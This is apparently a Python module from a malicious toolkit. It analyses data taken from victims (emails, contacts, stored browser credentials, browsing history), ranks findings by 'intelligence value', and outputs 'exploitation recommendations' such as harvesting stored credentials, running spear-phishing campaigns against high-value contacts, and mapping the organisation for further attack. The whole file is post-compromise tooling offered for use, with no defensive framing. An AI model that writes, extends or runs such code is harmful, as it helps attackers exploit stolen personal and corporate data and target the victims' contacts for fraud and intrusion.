"""
Intelligence Analysis Engine
Advanced data analysis and intelligence extraction
"""

import asyncio
import json
import logging
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from enum import Enum
import re
from collections import Counter

logger = logging.getLogger(__name__)

class IntelligenceType(Enum):
    BUSINESS = "business"
    SECURITY = "security"
    PERSONAL = "personal"
    FINANCIAL = "financial"
    NETWORK = "network"

class ThreatLevel(Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

@dataclass
class IntelligenceFinding:
    """Intelligence finding data structure"""
    finding_id: str
    intelligence_type: IntelligenceType
    threat_level: ThreatLevel
    title: str
    description: str
    evidence: List[str]
    confidence_score: float
    discovered_at: datetime
    source_data: Dict[str, Any]

class IntelligenceAnalysisEngine:
    """Advanced intelligence analysis engine"""
    
    def __init__(self):
        self.data_classifier = DataClassifier()
        self.pattern_analyzer = PatternAnalyzer()
        self.relationship_mapper = RelationshipMapper()
        self.threat_assessor = ThreatAssessor()
        
    async def analyze_victim_intelligence(self, victim_data: Dict[str, Any]) -> Dict[str, Any]:
        """Comprehensive intelligence analysis of victim data"""
        
        analysis_results = {
            'intelligence_summary': {},
            'findings': [],
            'threat_assessment': {},
            'recommendations': [],
            'confidence_score': 0.0,
            'analysis_timestamp': datetime.now(timezone.utc).isoformat()
        }
        
        # Analyze different data sources
        if victim_data.get('emails'):
            email_intelligence = await self.analyze_email_intelligence(victim_data['emails'])
            analysis_results['findings'].extend(email_intelligence['findings'])
        
        if victim_data.get('contacts'):
            contact_intelligence = await self.analyze_contact_intelligence(victim_data['contacts'])
            analysis_results['findings'].extend(contact_intelligence['findings'])
        
        if victim_data.get('browser_data'):
            browser_intelligence = await self.analyze_browser_intelligence(victim_data['browser_data'])
            analysis_results['findings'].extend(browser_intelligence['findings'])
        
        # Perform threat assessment
        analysis_results['threat_assessment'] = await self.threat_assessor.assess_threat_level(
            analysis_results['findings']
        )
        
        # Generate recommendations
        analysis_results['recommendations'] = await self.generate_exploitation_recommendations(
            analysis_results['findings']
        )
        
        # Calculate overall confidence score
        analysis_results['confidence_score'] = self.calculate_confidence_score(
            analysis_results['findings']
        )
        
        # Generate intelligence summary
        analysis_results['intelligence_summary'] = self.generate_intelligence_summary(
            analysis_results['findings']
        )
        
        return analysis_results
    
    async def analyze_email_intelligence(self, emails: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Analyze email data for intelligence value"""
        
        findings = []
        
        # Analyze email patterns
        email_patterns = await self.pattern_analyzer.analyze_email_patterns(emails)
        
        # Business intelligence
        business_emails = [e for e in emails if e.get('analysis', {}).get('business_content', False)]
        if business_emails:
            business_finding = IntelligenceFinding(
                finding_id=f"business_emails_{len(findings) + 1}",
                intelligence_type=IntelligenceType.BUSINESS,
                threat_level=ThreatLevel.MEDIUM,
                title="Business Email Access",
                description=f"Access to {len(business_emails)} business-related emails",
                evidence=[f"Found {len(business_emails)} business emails"],
                confidence_score=0.8,
                discovered_at=datetime.now(timezone.utc),
                source_data={'email_count': len(business_emails)}
            )
            findings.append(business_finding)
        
        # Financial intelligence
        financial_emails = [e for e in emails if e.get('analysis', {}).get('financial_content', False)]
        if financial_emails:
            financial_finding = IntelligenceFinding(
                finding_id=f"financial_emails_{len(findings) + 1}",
                intelligence_type=IntelligenceType.FINANCIAL,
                threat_level=ThreatLevel.HIGH,
                title="Financial Email Access",
                description=f"Access to {len(financial_emails)} financial-related emails",
                evidence=[f"Found {len(financial_emails)} financial emails"],
                confidence_score=0.9,
                discovered_at=datetime.now(timezone.utc),
                source_data={'email_count': len(financial_emails)}
            )
            findings.append(financial_finding)
        
        # Security intelligence
        security_emails = [e for e in emails if e.get('analysis', {}).get('security_content', False)]
        if security_emails:
            security_finding = IntelligenceFinding(
                finding_id=f"security_emails_{len(findings) + 1}",
                intelligence_type=IntelligenceType.SECURITY,
                threat_level=ThreatLevel.HIGH,
                title="Security Email Access",
                description=f"Access to {len(security_emails)} security-related emails",
                evidence=[f"Found {len(security_emails)} security emails"],
                confidence_score=0.85,
                discovered_at=datetime.now(timezone.utc),
                source_data={'email_count': len(security_emails)}
            )
            findings.append(security_finding)
        
        return {
            'findings': findings,
            'email_patterns': email_patterns,
            'total_emails_analyzed': len(emails)
        }
    
    async def analyze_contact_intelligence(self, contacts: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Analyze contact data for intelligence value"""
        
        findings = []
        
        # Analyze contact networks
        contact_networks = await self.relationship_mapper.map_contact_networks(contacts)
        
        # High-value contacts
        high_value_contacts = [c for c in contacts if c.get('analysis', {}).get('intelligence_value', 0) > 0.7]
        if high_value_contacts:
            high_value_finding = IntelligenceFinding(
                finding_id=f"high_value_contacts_{len(findings) + 1}",
                intelligence_type=IntelligenceType.NETWORK,
                threat_level=ThreatLevel.HIGH,
                title="High-Value Contact Network",
                description=f"Access to {len(high_value_contacts)} high-value contacts",
                evidence=[f"Found {len(high_value_contacts)} high-value contacts"],
                confidence_score=0.8,
                discovered_at=datetime.now(timezone.utc),
                source_data={'contact_count': len(high_value_contacts)}
            )
            findings.append(high_value_finding)
        
        # Executive contacts
        executive_contacts = [c for c in contacts if c.get('analysis', {}).get('executive_level', 0) > 0.5]
        if executive_contacts:
            executive_finding = IntelligenceFinding(
                finding_id=f"executive_contacts_{len(findings) + 1}",
                intelligence_type=IntelligenceType.BUSINESS,
                threat_level=ThreatLevel.CRITICAL,
                title="Executive Contact Access",
                description=f"Access to {len(executive_contacts)} executive-level contacts",
                evidence=[f"Found {len(executive_contacts)} executive contacts"],
                confidence_score=0.9,
                discovered_at=datetime.now(timezone.utc),
                source_data={'contact_count': len(executive_contacts)}
            )
            findings.append(executive_finding)
        
        return {
            'findings': findings,
            'contact_networks': contact_networks,
            'total_contacts_analyzed': len(contacts)
        }
    
    async def analyze_browser_intelligence(self, browser_data: Dict[str, Any]) -> Dict[str, Any]:
        """Analyze browser data for intelligence value"""
        
        findings = []
        
        # Stored credentials
        stored_credentials = browser_data.get('stored_credentials', [])
        if stored_credentials:
            credential_finding = IntelligenceFinding(
                finding_id=f"stored_credentials_{len(findings) + 1}",
                intelligence_type=IntelligenceType.SECURITY,
                threat_level=ThreatLevel.HIGH,
                title="Stored Browser Credentials",
                description=f"Access to {len(stored_credentials)} stored credentials",
                evidence=[f"Found {len(stored_credentials)} stored credentials"],
                confidence_score=0.95,
                discovered_at=datetime.now(timezone.utc),
                source_data={'credential_count': len(stored_credentials)}
            )
            findings.append(credential_finding)
        
        # Browser history
        history_data = browser_data.get('history', [])
        if history_data:
            history_finding = IntelligenceFinding(
                finding_id=f"browser_history_{len(findings) + 1}",
                intelligence_type=IntelligenceType.PERSONAL,
                threat_level=ThreatLevel.MEDIUM,
                title="Browser History Access",
                description=f"Access to {len(history_data)} browser history entries",
                evidence=[f"Found {len(history_data)} history entries"],
                confidence_score=0.7,
                discovered_at=datetime.now(timezone.utc),
                source_data={'history_count': len(history_data)}
            )
            findings.append(history_finding)
        
        return {
            'findings': findings,
            'total_browser_data_analyzed': len(browser_data)
        }
    
    async def generate_exploitation_recommendations(self, findings: List[IntelligenceFinding]) -> List[Dict[str, Any]]:
        """Generate actionable exploitation recommendations"""
        
        recommendations = []
        
        # Group findings by type
        findings_by_type = {}
        for finding in findings:
            finding_type = finding.intelligence_type.value
            if finding_type not in findings_by_type:
                findings_by_type[finding_type] = []
            findings_by_type[finding_type].append(finding)
        
        # Business intelligence recommendations
        if IntelligenceType.BUSINESS.value in findings_by_type:
            business_findings = findings_by_type[IntelligenceType.BUSINESS.value]
            recommendations.append({
                'type': 'business_intelligence',
                'priority': 'high',
                'description': 'Extract business intelligence from email and contact data',
                'actions': [
                    'analyze_business_emails',
                    'map_executive_relationships',
                    'extract_corporate_intelligence'
                ],
                'estimated_value': 'high',
                'confidence': 0.8
            })
        
        # Security intelligence recommendations
        if IntelligenceType.SECURITY.value in findings_by_type:
            security_findings = findings_by_type[IntelligenceType.SECURITY.value]
            recommendations.append({
                'type': 'security_exploitation',
                'priority': 'critical',
                'description': 'Exploit security vulnerabilities and access points',
                'actions': [
                    'harvest_stored_credentials',
                    'analyze_security_practices',
                    'identify_vulnerabilities'
                ],
                'estimated_value': 'critical',
                'confidence': 0.9
            })
        
        # Network intelligence recommendations
        if IntelligenceType.NETWORK.value in findings_by_type:
            network_findings = findings_by_type[IntelligenceType.NETWORK.value]
            recommendations.append({
                'type': 'network_expansion',
                'priority': 'high',
                'description': 'Expand attack surface through contact network',
                'actions': [
                    'target_high_value_contacts',
                    'create_spear_phishing_campaigns',
                    'map_organizational_structure'
                ],
                'estimated_value': 'high',
                'confidence': 0.7
            })
        
        return recommendations
    
    def calculate_confidence_score(self, findings: List[IntelligenceFinding]) -> float:
        """Calculate overall confidence score for intelligence analysis"""
        
        if not findings:
            return 0.0
        
        # Weight findings by threat level and confidence
        weighted_scores = []
        for finding in findings:
            threat_weight = {
                ThreatLevel.LOW: 0.2,
                ThreatLevel.MEDIUM: 0.5,
                ThreatLevel.HIGH: 0.8,
                ThreatLevel.CRITICAL: 1.0
            }.get(finding.threat_level, 0.5)
            
            weighted_score = finding.confidence_score * threat_weight
            weighted_scores.append(weighted_score)
        
        return sum(weighted_scores) / len(weighted_scores)
    
    def generate_intelligence_summary(self, findings: List[IntelligenceFinding]) -> Dict[str, Any]:
        """Generate comprehensive intelligence summary"""
        
        summary = {
            'total_findings': len(findings),
            'findings_by_type': {},
            'findings_by_threat_level': {},
            'high_confidence_findings': 0,
            'critical_findings': 0
        }
        
        # Count findings by type
        for finding in findings:
            finding_type = finding.intelligence_type.value
            if finding_type not in summary['findings_by_type']:
                summary['findings_by_type'][finding_type] = 0
            summary['findings_by_type'][finding_type] += 1
        
        # Count findings by threat level
        for finding in findings:
            threat_level = finding.threat_level.value
            if threat_level not in summary['findings_by_threat_level']:
                summary['findings_by_threat_level'][threat_level] = 0
            summary['findings_by_threat_level'][threat_level] += 1
        
        # Count high confidence findings
        summary['high_confidence_findings'] = len([
            f for f in findings if f.confidence_score > 0.8
        ])
        
        # Count critical findings
        summary['critical_findings'] = len([
            f for f in findings if f.threat_level == ThreatLevel.CRITICAL
        ])
        
        return summary

class DataClassifier:
    """Data classification engine for intelligence analysis"""
    
    def __init__(self):
        self.classification_rules = {
            'high_sensitivity': [
                'password', 'confidential', 'private', 'internal',
                'secret', 'classified', 'restricted', 'proprietary'
            ],
            'medium_sensitivity': [
                'contract', 'agreement', 'financial', 'billing',
                'invoice', 'payment', 'revenue', 'budget'
            ],
            'low_sensitivity': [
                'newsletter', 'marketing', 'promotion', 'advertisement',
                'social', 'entertainment', 'news'
            ]
        }
    
    def classify_content(self, content: str) -> str:
        """Classify content based on sensitivity rules"""
        content_lower = content.lower()
        
        for sensitivity, keywords in self.classification_rules.items():
            if any(keyword in content_lower for keyword in keywords):
                return sensitivity
        
        return 'low_sensitivity'
    
    def extract_keywords(self, content: str) -> List[str]:
        """Extract relevant keywords from content"""
        # Simple keyword extraction (can be enhanced with NLP)
        words = re.findall(r'\b\w+\b', content.lower())
        return [word for word in words if len(word) > 3]

class PatternAnalyzer:
    """Pattern analysis engine for intelligence extraction"""
    
    async def analyze_email_patterns(self, emails: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Analyze email patterns for intelligence"""
        
        patterns = {
            'frequent_senders': {},
            'common_subjects': {},
            'time_patterns': {},
            'attachment_patterns': {}
        }
        
        # Analyze senders
        senders = [email.get('from', '') for email in emails]
        patterns['frequent_senders'] = dict(Counter(senders).most_common(10))
        
        # Analyze subjects
        subjects = [email.get('subject', '') for email in emails]
        patterns['common_subjects'] = dict(Counter(subjects).most_common(10))
        
        # Analyze time patterns
        times = [email.get('date', '') for email in emails]
        patterns['time_patterns'] = self.analyze_time_patterns(times)
        
        return patterns
    
    def analyze_time_patterns(self, times: List[str]) -> Dict[str, Any]:
        """Analyze time patterns in emails"""
        # Simple time pattern analysis
        return {
            'total_emails': len(times),
            'time_range': 'analyzed'
        }

class RelationshipMapper:
    """Relationship mapping engine for contact analysis"""
    
    async def map_contact_networks(self, contacts: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Map contact networks and relationships"""
        
        networks = {
            'total_contacts': len(contacts),
            'business_contacts': 0,
            'personal_contacts': 0,
            'executive_contacts': 0,
            'domains': set(),
            'organizations': set()
        }
        
        for contact in contacts:
            # Count contact types
            if contact.get('analysis', {}).get('business_contact', False):
                networks['business_contacts'] += 1
            
            if contact.get('analysis', {}).get('executive_level', 0) > 0.5:
                networks['executive_contacts'] += 1
            
            # Extract domains
            for email_info in contact.get('email_addresses', []):
                email = email_info.get('value', '')
                if '@' in email:
                    domain = email.split('@')[1]
                    networks['domains'].add(domain)
            
            # Extract organizations
            for org_info in contact.get('organizations', []):
                org_name = org_info.get('name', '')
                if org_name:
                    networks['organizations'].add(org_name)
        
        # Convert sets to lists for JSON serialization
        networks['domains'] = list(networks['domains'])
        networks['organizations'] = list(networks['organizations'])
        
        return networks

class ThreatAssessor:
    """Threat assessment engine for intelligence evaluation"""
    
    async def assess_threat_level(self, findings: List[IntelligenceFinding]) -> Dict[str, Any]:
        """Assess overall threat level based on findings"""
        
        if not findings:
            return {
                'overall_threat_level': 'low',
                'threat_score': 0.0,
                'risk_factors': []
            }
        
        # Calculate threat score
        threat_scores = {
            ThreatLevel.LOW: 1,
            ThreatLevel.MEDIUM: 3,
            ThreatLevel.HIGH: 7,
            ThreatLevel.CRITICAL: 10
        }
        
        total_score = sum(threat_scores.get(f.threat_level, 0) for f in findings)
        max_possible_score = len(findings) * 10
        threat_score = total_score / max_possible_score if max_possible_score > 0 else 0
        
        # Determine overall threat level
        if threat_score >= 0.8:
            overall_threat = 'critical'
        elif threat_score >= 0.6:
            overall_threat = 'high'
        elif threat_score >= 0.4:
            overall_threat = 'medium'
        else:
            overall_threat = 'low'
        
        # Identify risk factors
        risk_factors = []
        if any(f.intelligence_type == IntelligenceType.SECURITY for f in findings):
            risk_factors.append('Security vulnerabilities detected')
        if any(f.intelligence_type == IntelligenceType.FINANCIAL for f in findings):
            risk_factors.append('Financial data access')
        if any(f.threat_level == ThreatLevel.CRITICAL for f in findings):
            risk_factors.append('Critical findings present')
        
        return {
            'overall_threat_level': overall_threat,
            'threat_score': threat_score,
            'risk_factors': risk_factors,
            'findings_count': len(findings)
        }